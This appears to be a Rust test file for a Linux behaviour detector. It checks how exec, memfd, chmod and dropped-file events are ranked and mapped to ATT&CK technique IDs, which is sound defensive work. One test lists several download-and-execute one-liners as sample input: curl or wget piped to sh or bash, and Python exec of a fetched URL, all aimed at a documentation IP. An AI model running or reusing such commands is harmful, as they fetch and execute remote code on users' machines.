// SPDX-License-Identifier: GPL-3.0-only
use super::support::*;

#[test]
fn a_plain_exec_is_info_and_an_interpreter_is_low_with_its_technique() {
    let out = run(vec![
        exec(1, "/bin/ls", &["ls", "-l"]),
        exec(1, "/usr/bin/python3.12", &["python3.12", "-c", "pass"]),
    ]);
    assert_eq!(rows(&out, "process.exec").len(), 2);
    assert!(rows(&out, "process.exec")
        .iter()
        .all(|row| text(row, "finding.tier") == "info"));
    let python = rows(&out, "process.interpreter");
    assert_eq!(python.len(), 1);
    assert_eq!(text(python[0], "finding.tier"), "low");
    assert_eq!(
        list(python[0], "finding.technique"),
        ["T1059.006", "DET0063"]
    );
    assert_eq!(out.badge, 1, "only the interpreter counts");
}

#[test]
fn shells_and_more_interpreters_are_recognised_by_name_busybox_applet_and_hashbang() {
    for (path, argv) in [
        ("/bin/ash", vec!["ash"]),
        ("/usr/bin/ksh", vec!["ksh"]),
        ("/usr/bin/php8.2", vec!["php8.2"]),
        ("/usr/bin/lua5.4", vec!["lua5.4"]),
        ("/usr/bin/tclsh", vec!["tclsh"]),
        ("/usr/bin/gawk", vec!["gawk"]),
        ("/bin/busybox", vec!["busybox", "sh"]),
    ] {
        let out = run(vec![exec(1, path, &argv)]);
        assert!(has(&out, "process.interpreter"), "{path}");
    }
    assert!(!has(
        &run(vec![exec(1, "/usr/bin/pythonista", &["pythonista"])]),
        "process.interpreter"
    ));
    // A script run by its own path is judged by the interpreter its #! line names.
    let script = with_notes(
        exec(1, "/tmp/run.sh", &["run.sh"]),
        vec![exec_image(Some("/usr/bin/env python3"), "/usr/bin/python3")],
    );
    let out = run(vec![script]);
    let rows = rows(&out, "process.interpreter");
    assert_eq!(rows.len(), 1);
    assert_eq!(list(rows[0], "finding.technique"), ["T1059.006", "DET0063"]);
}

#[test]
fn a_failed_exec_is_one_tier_down() {
    let out = run(vec![failed_exec(1, "/bin/sh", &["sh"])]);
    assert_eq!(tier(&out, "process.interpreter").as_deref(), Some("info"));
}

#[test]
fn download_cradle_needs_a_fetcher_whose_output_runs() {
    for script in [
        "wget -q -O - http://203.0.113.9/d.sh | sh",
        "curl -s http://203.0.113.9/x | bash",
        "bash -c \"$(curl -fsSL http://203.0.113.9/x)\"",
        "wget http://203.0.113.9/k -O /tmp/k && chmod +x /tmp/k && /tmp/k",
        "python3 -c 'import urllib.request;exec(urllib.request.urlopen(\"http://203.0.113.9\").read())'",
    ] {
        let out = run(vec![shell(1, script)]);
        assert_eq!(tier(&out, "execution.download_cradle").as_deref(), Some("medium"), "{script}");
    }
    for script in [
        "curl -s http://203.0.113.9/x -o /tmp/x",
        "echo hello | sh",
        "ls | wc -l",
    ] {
        assert!(
            !has(&run(vec![shell(1, script)]), "execution.download_cradle"),
            "{script}"
        );
    }
}

#[test]
fn chmod_plus_x_in_a_staging_directory_is_medium_and_elsewhere_nothing() {
    for path in [
        "/tmp/payload",
        "/var/tmp/x",
        "/dev/shm/x",
        "/home/u/.cache/x",
    ] {
        let out = run(vec![chmod(1, path, 0o755)]);
        assert_eq!(
            tier(&out, "execution.chmod_exec_temp").as_deref(),
            Some("medium"),
            "{path}"
        );
    }
    assert!(!has(
        &run(vec![chmod(1, "/home/u/tool", 0o755)]),
        "execution.chmod_exec_temp"
    ));
    assert!(!has(
        &run(vec![chmod(1, "/tmp/data", 0o644)]),
        "execution.chmod_exec_temp"
    ));
}

#[test]
fn exec_from_a_staging_or_hidden_directory_is_medium_except_the_sample() {
    let out = run(vec![exec(1, "/dev/shm/miner", &["miner"])]);
    let row = rows(&out, "execution.temp_exec");
    assert_eq!(row.len(), 1);
    assert_eq!(list(row[0], "finding.technique"), ["T1027.011", "DET0344"]);
    let hidden = run(vec![exec(1, "/home/u/.cache/x", &["x"])]);
    assert_eq!(
        list(rows(&hidden, "execution.temp_exec")[0], "finding.technique"),
        ["T1564.001", "DET0032"]
    );
    assert!(!has(
        &run(vec![exec(1, "/usr/bin/ls", &["ls"])]),
        "execution.temp_exec"
    ));
}

#[test]
fn memfd_exec_by_fd_path_and_by_empty_path_and_a_plain_memfd_is_low() {
    let create = || {
        let row = sys(1, 319, "memfd_create", [0, 1, 0, 0, 0, 0], 5);
        with_path(row, "arg0.name", "x")
    };
    let by_proc = run(vec![create(), exec(1, "/proc/self/fd/5", &["x"])]);
    assert_eq!(
        tier(&by_proc, "process.memfd_exec").as_deref(),
        Some("high")
    );
    assert_eq!(tier(&by_proc, "process.memfd").as_deref(), Some("low"));
    assert!(!has(&by_proc, "execution.fileless_exec"));
    let by_dev = run(vec![create(), exec(1, "/dev/fd/5", &["x"])]);
    assert!(has(&by_dev, "process.memfd_exec"));
    let empty = sys(1, 322, "execveat", [5, 0, 0, 0, 0x1000, 0], 0);
    let by_empty = run(vec![create(), empty]);
    assert!(has(&by_empty, "process.memfd_exec"));
    assert_eq!(
        list(
            rows(&by_empty, "process.memfd_exec")[0],
            "finding.technique"
        ),
        ["T1620", "DET0300"]
    );
    assert_eq!(
        list(rows(&by_empty, "process.memfd")[0], "finding.technique"),
        ["T1620", "DET0300"]
    );
    // An fd that is not a memfd is a fileless exec of another kind.
    let out = run(vec![
        open_read(1, "/tmp/f", 6),
        exec(1, "/proc/self/fd/6", &["f"]),
    ]);
    assert!(has(&out, "execution.fileless_exec"));
    assert!(!has(&out, "process.memfd_exec"));
}

#[test]
fn an_exec_of_a_file_with_no_name_left_is_fileless() {
    let unnamed = with_notes(exec(1, "/tmp/gone", &["gone"]), vec![file_id(6, 77, 0)]);
    let out = run(vec![unnamed]);
    assert_eq!(
        tier(&out, "execution.fileless_exec").as_deref(),
        Some("high")
    );
    let named = with_notes(exec(1, "/tmp/here", &["here"]), vec![file_id(6, 78, 1)]);
    assert!(!has(&run(vec![named]), "execution.fileless_exec"));
}

#[test]
fn a_file_the_run_wrote_and_then_ran_is_a_dropped_exec_by_identity_or_path() {
    let by_path = run(vec![
        open_write(1, "/tmp/kinsing", 3),
        write(1, 3, b"\x7fELF"),
        close(1, 3),
        exec(2, "/tmp/kinsing", &["kinsing"]),
    ]);
    assert_eq!(
        tier(&by_path, "execution.dropped_exec").as_deref(),
        Some("high")
    );
    // The identity of the written inode matches the executed one, whatever the name.
    let by_key = run(vec![
        with_notes(open_write(1, "/var/lib/a", 3), vec![file_id(1, 500, 1)]),
        with_notes(
            exec(2, "/var/lib/renamed", &["x"]),
            vec![file_id(6, 500, 1)],
        ),
    ]);
    assert!(has(&by_key, "execution.dropped_exec"));
    // A file the run did not write is not dropped.
    assert!(!has(
        &run(vec![exec(2, "/opt/app/run", &["run"])]),
        "execution.dropped_exec"
    ));
}

#[test]
fn a_compiled_program_is_compile_then_run_not_a_dropper() {
    let out = run(vec![
        exec(1, "/usr/bin/gcc", &["gcc", "x.c", "-o", "/tmp/x"]),
        open_write(1, "/tmp/x", 3),
        exec(2, "/tmp/x", &["x"]),
    ]);
    assert_eq!(
        tier(&out, "execution.compile_then_run").as_deref(),
        Some("medium")
    );
    assert!(!has(&out, "execution.dropped_exec"));
}

#[test]
fn an_elf_written_into_a_memfd_and_a_dropped_library_are_medium() {
    let out = run(vec![
        with_path(
            sys(1, 319, "memfd_create", [0, 0, 0, 0, 0, 0], 4),
            "arg0.name",
            "payload",
        ),
        write(1, 4, b"\x7fELF\x02\x01"),
    ]);
    assert_eq!(tier(&out, "execution.memfd_elf").as_deref(), Some("medium"));
    let text_only = run(vec![
        with_path(
            sys(1, 319, "memfd_create", [0, 0, 0, 0, 0, 0], 4),
            "arg0.name",
            "p",
        ),
        write(1, 4, b"hello"),
    ]);
    assert!(!has(&text_only, "execution.memfd_elf"));
    let library = run(vec![
        open_write(1, "/tmp/libx.so", 3),
        write(1, 3, b"\x7fELF"),
        close(1, 3),
        open_read(1, "/tmp/libx.so", 4),
        sys(1, 9, "mmap", [0, 4096, 5, 2, 4, 0], 0x7000),
    ]);
    assert_eq!(
        tier(&library, "execution.dropped_library").as_deref(),
        Some("medium")
    );
}

#[test]
fn rules_name_a_sample_only_when_not_the_launched_program() {
    let out = run(vec![call(1, 0, "read", 0)]);
    assert!(out.rows.is_empty());
}
